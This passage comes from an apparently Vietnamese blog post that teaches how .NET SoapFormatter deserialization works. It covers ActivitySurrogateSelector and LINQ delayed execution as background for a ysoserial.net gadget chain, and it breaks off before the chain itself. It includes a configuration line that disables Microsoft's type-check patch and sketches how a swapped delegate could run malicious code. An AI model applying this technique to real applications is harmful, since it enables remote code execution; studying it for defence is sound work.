</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;========================================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// deserialize</span>
</span></span><span class="line"><span class="cl">            <span class="n">stream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//Person p = (Person)soapFormatter.Deserialize(stream);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//=================================== begin new code ===================================</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">fmt2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">Person</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">fmt2</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//=================================== end new code ===================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Age</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="p">.</span><span class="n">SayHello</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Kết quả khi chạy chương trình:</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%209.png"></p>
<p>Ở đoạn code cũ, chúng ta dùng câu lệnh (dòng 64)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">Person</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">soapFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Câu lệnh này sẽ sử dụng method <code>SetObjectData()</code> được định nghĩa trong class <code>PersonSerializeSurrogate</code> của chúng ta. Còn với đoạn code mới, object <code>fmt2</code> sử dụng <code>native deserialzation</code> do đó, có lỗi xảy ra.</p>
<p>Lý do là khi parsing object trong deserializaed soap data, nó sẽ gọi method <code>CheckSerializable</code> đầu tiên để xác định xem liệu Object muốn parse có thể serializable không.</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2010.png"></p>
<p>Class <code>Person</code> trong đoạn mã không thể serialized do <strong>không implement interface ISerializable</strong> hoặc <strong>không có các thuộc tính được đánh dấu [Serializable]</strong>. Khi một object được serialize, nó cần đáp ứng một số yêu cầu để đảm bảo quá trình serialize và deserialize object được thực hiện thành công.</p>
<p>Trong trường hợp này, <strong>class Person không implemnet ISerializable và không có thuộc tính [Serializable]</strong> . Do đó, object Person sẽ cố gắng serialize bằng cách sử dụng SoapFormatter, quá trình này không thành công và gây ra lỗi.</p>
<blockquote>
<p><strong>Để giải quyết vấn đề này, ta cần sử dụng class <code>ActivitySurrogateSelector</code>.</strong></p>
</blockquote>
<h2 id="iii-activitysurrogateselector">III <strong><strong>ActivitySurrogateSelector</strong></strong></h2>
<p>Trong phần trước chúng ta đã biết có tồn tại một vấn đề: <strong>Một class được serialize nhưng khi deserialize nó không thể deserialize proxy selector được implement bởi chúng ta. Khi thực thi nó sẽ văng ra lỗi.</strong></p>
<p>Và cuối phần II, tôi đã đề cập vấn đề này có thể giải quyết bằng <code>ActivitySurrogateSelector</code></p>
<p>Trong phần này tôi sẽ tiến hành debug để hiểu rõ tại sao <code>ActivitySurrogateSelector</code> có thể giải quyết được.</p>
<h3 id="1-background-iserializationsurrogate-and-surrogateselector">1. [background] ISerializationSurrogate and SurrogateSelector</h3>
<ul>
<li>
<p>Với serialization và deserialization trong C#, chúng ta sẽ thấy có lúc dùng <code>SurrogateSelector</code>, có lúc thì implement <code>ISerializationSurrogate</code>. Vậy sự khác biệt giữa đúng là gì?</p>
</li>
<li>
<p>Với <code>ISerializationSurrogate</code>, hãy quay lại ví dụ ở phần trước:</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2011.png"></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2012.png"></p>
<ul>
<li>Dễ thấy, class <code>PersonSerializeSurrogate</code> của chúng ta implemnet lại interface <code>ISerializationSurrogate</code>. Hãy debug với DnSpy64:
<ul>
<li>
<p>Đầu tiên, chúng ta chạy code để build ra file .exe</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2013.png"></p>
</li>
<li>
<p>Load file .exe và các thư viện liên quan vào dnspy64</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2014.png"></p>
</li>
<li>
<p>Đặt breakpoint và nhấn F5, tại ô Executable, trỏ đến file .exe mà chúng ta muốn thực thi</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2015.png"></p>
</li>
<li>
<p>Thế là debug thôi:</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2016.png"></p>
<ul>
<li>Èo, DnSpy bảo là nên dùng bản 32bit để chạy. Vậy thì đổi thôi</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2017.png"></p>
<ul>
<li>Ngon lành!! Vậy debug thôi</li>
</ul>
</li>
</ul>
</li>
<li>Đặt breakpoint tại  <code>soapFormatter.Serialize(stream, person)</code></li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2018.png"></p>
<ul>
<li>Trace, ta sẽ thấy <code>System.Runtime.Serialization.Formatters.Soap.WriteObjectInfo.InitSerialize()</code> được gọi</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2019.png"></p>
<ul>
<li>Đến dòng 79:</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2020.png"></p>
<p><em><strong>Ta thấy field <code>m_surrogates</code> của <code>SurrogateSelector</code> có một element là <code>SoapDeserialization.PersonSerializeSurrogate</code>. Đây là class mà chúng ta implement!!!</strong></em></p>
</li>
<li>
<p>Với <code>SurrogateSelector</code> proxy selector,hãy chỉnh sửa ví dụ trước đó một tí:</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2021.png"></p>
<blockquote>
<p>Trong ví dụ, dễ thấy đang có lỗi xảy ra ở dòng 59. Lý do là thiếu lib. Để fix lỗi này ta chỉ cần thêm thư viện <strong>System.Configuration</strong></p>
</blockquote>
<ul>
<li>Tương tự với ở trên, ta cũng debug</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2022.png"></p>
<ul>
<li>Nhìn vào đây, ta thấy <code>SurrogateSelector</code> chứa <code>ISerializationSurrogate</code> và tất cả các  object của  ISerializationSurrogate đều là member của field m_surrogates của SurrogateSelector.</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2023.png"></p>
<p>Vậy điều này có nghĩa gì?</p>
<blockquote>
<p><em><strong>Khi chúng ta sử dụng <code>surrogateSelector.GetSurrogate</code>, chúng ta implement GetSurrogate method trong SurrogateSelector object. Method GetSurrogate này có thể bị overwrite.</strong></em></p>
</blockquote>
<p><img alt="https://media.makeameme.org/created/so-important-much.jpg" src="https://media.makeameme.org/created/so-important-much.jpg"></p>
</li>
</ul>
<h3 id="2-activitysurrogateselector">2. <strong><strong>ActivitySurrogateSelector</strong></strong></h3>
<ul>
<li>
<p>Bây giờ, hãy quay lại đoạn code ở phần SurrogateSelector</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2024.png"></p>
<p>Ta thấy <code>fmt2</code> không sử dụng proxy selector nhưng nó lại có thể deserialize mà không bị lỗi</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2025.png"></p>
<p>Tại sao vậy nhỉ???</p>
</li>
<li>
<p>Cùng debug để hiểu rõ nguyên lý của <strong><strong>ActivitySurrogateSelector.</strong></strong> Tiếp tục với phần trước đó, ta có <strong>surrogateSelector chứa <code>MySurrogateSelector</code></strong></p>
</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2026.png"></p>
<ul>
<li>Đặt breakpoint tại <code>MySurrogateSelector</code> và tiếp tục, sẽ thấy <strong><code>surrogateSelector.GetSurrogate()</code></strong> ở dòng 79 sẽ gọi <code>MySurrogateSelector.GetSurrogate()</code></li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2027.png"></p>
<ul>
<li>Vì class Person không chỉ rõ được thuộc tính <code>[Serializable]</code> nên biến flag ở dòng 13 sẽ có giá trị <code>true</code> (vì type.IsSerializable=false). Do đó, nó sẽ vào dòng lệnh 17. Câu lệnh này sẽ trả về 1 instance của Object <code>ObjectSurrogate</code></li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2028.png"></p>
<ul>
<li>Quay lại dòng lệnh 79 của <code>InitSerialize()</code>. Vì <strong>surrogateSelector và this.serializationSurrogate</strong> khác null, nên chương trình sẽ vào điều kiện rẽ nhánh 1</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2029.png"></p>
<ul>
<li>Tiếp tục chương trình, ta thấy dòng lệnh 84 được thực thi</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2030.png"></p>
<ul>
<li>F11 để đi vào hàm bên trong, ta sẽ thấy nó đi vào hàm <code>ObjectSurrogate.GetObjectData()</code></li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2031.png"></p>
<ul>
<li>Tiếp tục đến dòng 155, info set type <code>ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef</code></li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2032.png"></p>
<p><strong>Mặt khác, ta thấy <code>ObjectSerializedRef</code> là một class có thể serialize được.</strong></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2033.png"></p>
<p>Tiếp tục chương trình, ta thấy <code>[this.si](http://this.si)</code> sẽ có ObjectType là <code>**ObjectSerializedRef</code> - một class có thể Serialize được.**</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2034.png"></p>
<p>Dòng lệnh 86 và tiếp sau đó sẽ làm cho objectWriter trở thành 1 object có thể serialize</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2035.png"></p>
<ul>
<li>Tiếp tục chương trình</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2036.png"></p>
<p>Đến đây, giá trị <code>stm</code> đã là một <strong>serialized object.</strong> Do đó, chương trình sẽ tiếp tục mà không bị lỗi</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2037.png"></p>
<blockquote>
<p>NOTE:</p>
<p>Trong đoạn code có sử dụng câu lệnh:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Configuration</span><span class="p">.</span><span class="n">ConfigurationManager</span><span class="p">.</span><span class="n">AppSettings</span><span class="p">.</span><span class="n">Set</span><span class="p">(</span><span class="s">&#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&#34;</span><span class="p">,</span> <span class="s">&#34;true&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Mục đích câu lệnh này là bypass hạn chế khi test trên các framework có version cao với vì Microsoft đã bản pacth từ phiên bản 4.8 trở đi.</p>
</blockquote>
<p>Yeah, vậy là chúng ta đã hiểu tại sao <strong><strong>ActivitySurrogateSelector</strong></strong> thì không bị lỗi: bởi vì khi tới hàm <code>Deserialize()</code> thì stm đã được chuyển thành dạng serialize rồi.</p>
<h2 id="iv-linq-knowledge">IV LINQ Knowledge</h2>
<p>Để hiểu được ActivitySurrogateSelector attack chain, ta cần biết 1 ít về Linq.</p>
<p>Theo định nghĩa sách giáo khoa thì:</p>
<blockquote>
<p>The official definition of Linq is Language Integrated Query (LINQ) is a series of technologies that directly integrate query functions into the C## language. It can be considered that Linq uses Lambda expressions to complete functions similar to SQL syntax.</p>
</blockquote>
<p>Để hiểu rõ, ta đi qua ví dụ sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">word</span> <span class="p">=</span> <span class="s">&#34;hello from linq.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">words</span> <span class="p">=</span> <span class="n">word</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">q1</span> <span class="p">=</span> <span class="k">from</span> <span class="n">s</span> <span class="k">in</span> <span class="n">words</span>
</span></span><span class="line"><span class="cl">        <span class="k">where</span> <span class="n">s</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="sc">&#39;o&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">select</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">q1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">item</span> <span class="k">in</span> <span class="n">q1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">item</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>khi chạy, output sẽ là</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2038.png"></p>
<p>và binary sau khi load vào dnspy sẽ được decompile như sau</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2039.png"></p>
<p>Trong đoạn code trên, câu lệnh:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">q1</span> <span class="p">=</span> <span class="k">from</span> <span class="n">s</span> <span class="k">in</span> <span class="n">words</span>
</span></span><span class="line"><span class="cl">        <span class="k">where</span> <span class="n">s</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="sc">&#39;o&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">select</span> <span class="n">s</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tôi tinh gọn nó như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">words</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">s</span> <span class="p">=&gt;</span> <span class="n">s</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="sc">&#39;o&#39;</span><span class="p">)).</span><span class="n">Select</span><span class="p">(</span><span class="n">s</span><span class="p">=&gt;</span><span class="n">s</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Format để gọi như trên được định nghĩa như sau:</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2040.png"></p>
<blockquote>
<p>Để vào được định nghĩa như trên, tôi dùng extension <a href="https://marketplace.visualstudio.com/items?itemName=VladimirChirikov.GoToDnSpy">GoToDnSpy</a>. Khi ấn <code>ctrl + click</code> vào từ khóa <code>where</code> (Từ khóa <strong><code>Where</code></strong> trong C## là một phương thức được sử dụng trong thư viện LINQ), extension nafy sẽ dùng dnspy decompile code trong thư viện <code>System.Linq</code> (thư viện này hỗ trợ chạy LINQ) và show lên cho chúng ta</p>
</blockquote>
<p>nên khi decompile bằng DnSpy. Câu lệnh tương đương với dnspy là</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">IEnumerable</span><span class="p">&lt;</span><span class="nt">string</span><span class="p">&gt;</span> <span class="nx">q</span> <span class="o">=</span> <span class="nx">Enumerable</span><span class="p">.</span><span class="nx">Where</span><span class="p">&lt;</span><span class="nt">string</span><span class="p">&gt;(</span><span class="nx">words</span><span class="p">,</span> <span class="p">(</span><span class="nx">string</span> <span class="nx">s</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">Enumerable</span><span class="p">.</span><span class="nx">Contains</span><span class="p">&lt;</span><span class="nt">char</span><span class="p">&gt;(</span><span class="nx">s</span><span class="p">.</span><span class="nx">ToLower</span><span class="p">(),</span> <span class="s1">&#39;o&#39;</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Hãy phân tích một cấu trúc khai báo như sau:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">&gt;</span> <span class="n">Where</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">&gt;(</span><span class="k">this</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">&gt;</span> <span class="n">source</span><span class="p">,</span> <span class="n">Func</span><span class="p">&lt;</span><span class="n">TSource</span><span class="p">,</span> <span class="kt">bool</span><span class="p">&gt;</span> <span class="n">predicate</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Đây là định nghĩa phương thức, cho biết tên của phương thức (<strong><code>Where</code></strong>), cách truy cập vào phương thức (<strong><code>public</code></strong>) và các tham số mà nó mong đợi:</p>
<ul>
<li><strong><code>public static</code></strong>: Điều này cho biết phương thức có thể được truy cập từ bất kỳ đâu trong chương trình và không cần một đối tượng của lớp để gọi phương thức này.</li>
<li><strong><code>IEnumerable&lt;TSource&gt;</code></strong>: Đây là kiểu dữ liệu trả về của phương thức. Nó cho biết phương thức sẽ trả về một chuỗi các phần tử kiểu <strong><code>TSource</code></strong>.</li>
<li><strong><code>Where&lt;TSource&gt;</code></strong>: Đây là một phương thức generic, được chỉ định bởi <strong><code>&lt;TSource&gt;</code></strong>, có nghĩa là nó có thể hoạt động với bất kỳ kiểu nào được chỉ định bởi người gọi.</li>
<li><strong><code>this IEnumerable&lt;TSource&gt; source</code></strong>: Đây là tham số đầu tiên có tên là <strong><code>source</code></strong>, đại diện cho bộ sưu tập đầu vào mà phép <strong><code>Where</code></strong> sẽ được thực hiện. Trong ví dụ, <strong><code>source</code></strong> đề cập đến một bộ sưu tập các phần tử, chẳng hạn như một danh sách hoặc một mảng.</li>
<li><strong><code>Func&lt;TSource, bool&gt; predicate</code></strong>: Đây là tham số thứ hai có tên là <strong><code>predicate</code></strong>. Đây là một delegate có kiểu <strong><code>Func&lt;TSource, bool&gt;</code></strong>, được sử dụng để xử lý bộ sưu tập và trả về bộ sưu tập kết quả sau khi xử lý.</li>
</ul>
<blockquote>
<p><em><strong>Delegate là gì?</strong></em></p>
<p><em><strong>Trong ngôn ngữ lập trình C#, delegate là một kiểu dữ liệu đặc biệt, cho phép chúng ta tạo ra các tham chiếu đến phương thức. Nó giống như một con trỏ hàm trong các ngôn ngữ khác. Delegate có thể được sử dụng để tạo ra các biểu thức hàm (function expressions) và truyền chúng như các tham số cho các phương thức khác.</strong></em></p>
</blockquote>
<p>Quay lại với ví dụ của chúng ta:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">words</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">s</span> <span class="p">=&gt;</span> <span class="n">s</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="sc">&#39;o&#39;</span><span class="p">)).</span><span class="n">Select</span><span class="p">(</span><span class="n">s</span><span class="p">=&gt;</span><span class="n">s</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><strong><code>Where()</code></strong> và <strong><code>Select()</code></strong> là hai phương thức được sử dụng trong LINQ.</li>
<li><strong><code>Where()</code></strong> thực hiện việc lọc các phần tử trong bộ sưu tập dựa trên một điều kiện được xác định bởi một biểu thức lambda. Trong ví dụ này, biểu thức lambda là <strong><code>s =&gt; s.ToLower().Contains('o')</code></strong>, nghĩa là chỉ giữ lại các phần tử trong bộ sưu tập mà chứa ký tự &lsquo;o&rsquo;.</li>
<li>Sau khi <strong><code>Where()</code></strong> hoàn thành, kết quả là một collection chứa các phần tử đã được lọc.</li>
<li>Tiếp theo, <strong><code>Select()</code></strong> thực hiện việc chuyển đổi các phần tử trong collection thành một định dạng khác dựa trên một biểu thức lambda khác. Trong ví dụ này, biểu thức lambda là <strong><code>s =&gt; s</code></strong>, nghĩa là giữ nguyên các phần tử trong bộ sưu tập.</li>
<li>Khi hoàn thành <strong><code>Select()</code></strong>, chúng ta có collection cuối cùng, chứa các phần tử đã được lọc và chuyển đổi.</li>
</ul>
<p>Vì vậy, hai quá trình ủy quyền (<strong><code>Where()</code></strong> và <strong><code>Select()</code></strong>) hoạt động lần lượt trên input collectiono, xử lý và truyền các phần tử qua lại giữa các phương thức cho đến khi chúng được lọc và chuyển đổi thành output collection.</p>
<ul>
<li>Một điều lưu ý ở đây LINQ là kiểu <code>delayed execution</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">q1</span> <span class="p">=</span> <span class="k">from</span> <span class="n">s</span> <span class="k">in</span> <span class="n">words</span>
</span></span><span class="line"><span class="cl">        <span class="k">where</span> <span class="n">s</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="sc">&#39;o&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">select</span> <span class="n">s</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Trong ví dụ trên, <strong><code>q1</code></strong> là một biến dùng để lưu trữ truy vấn LINQ.</p>
<ul>
<li>Tuy nhiên, việc khai báo <strong><code>q1</code></strong> chỉ tạo ra một thể hiện của truy vấn, không thực hiện việc xử lý trực tiếp.</li>
<li>Thực tế, việc thực hiện xử lý và trả về kết quả sẽ xảy ra khi chúng ta thực hiện việc chọn (select) trên <strong><code>q1</code></strong>.</li>
<li>Khi chúng ta thực hiện việc chọn (select) trên <strong><code>q1</code></strong>, truy vấn LINQ sẽ được thực thi và kết quả sẽ được trả về.</li>
</ul>
<p>Điều này có nghĩa là LINQ thực hiện trì hoãn (delayed execution), tức là việc xử lý truy vấn không xảy ra ngay lập tức khi truy vấn được khai báo, mà sẽ diễn ra chỉ khi kết quả cần được truy xuất (ví dụ: khi chúng ta thực hiện việc chọn - select). Điều này giúp tối ưu hiệu suất của ứng dụng và giảm thiểu việc thực hiện không cần thiết của các truy vấn LINQ. Nghe thì có vẻ khó hiểu, ta hãy nhìn vào bức ảnh này (tôi sưu tầm trên internet)</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2041.png"></p>
<blockquote>
<p>Đây là tính chất quan trọng mà chúng ta sẽ dùng cho <strong>ActivitySurrogateSelector attack chain.</strong></p>
</blockquote>
<h2 id="v-attack-chain">V Attack chain</h2>
<blockquote>
<p>Trong <a href="http://ysoserial.net">ysoserial.net</a>, SoapFormatter có nhiều chains. Trong blog này, tôi sẽ trình bày chain: <strong>ActivitySurrogateSelector</strong></p>
</blockquote>
<p>Yeah, tới đây chúng ta đã biết thêm:</p>
<ol>
<li><code>ActivitySurrogateSelector</code> để select 1 proxy, hỗ trợ deserialize 1 class bất kì (không cần tag <code>[Serializable]</code>)</li>
<li>Ngôn ngữ LINQ là có một tính chất <code>delayed execution</code></li>
</ol>
<p>Vậy những thứ này giúp ích điều gì?</p>
<ul>
<li>
<p>Một chút về Java deserialize:</p>
<blockquote>
<p>Ứng dụng RMI trong Java sẽ thực thi Runtime.exec() trong constructor, và thực hiện malicious code sau khi load class</p>
</blockquote>
</li>
<li>
<p>Tương tự trong C#:</p>
<blockquote>
<p>Nếu chúng ta có thể load một assembly riêng lên, thì việc kích hoạt <code>constructor()</code> khi tạo một <code>instance</code> mới cũng sẽ thực thi malicious code.</p>
<p>Nếu chúng ta thay thế delegate trong LINQ, load assembly và tạo một instance bằng cách thay thế delegate, thì malicous code sẽ được thực thi sau khi kích hoạt LINQ.</p>
</blockquote>
</li>
<li>
<p>Từ ý tưởng này, Researcher James Forshaw đã thiết kế một chain deserialize như sau</p>
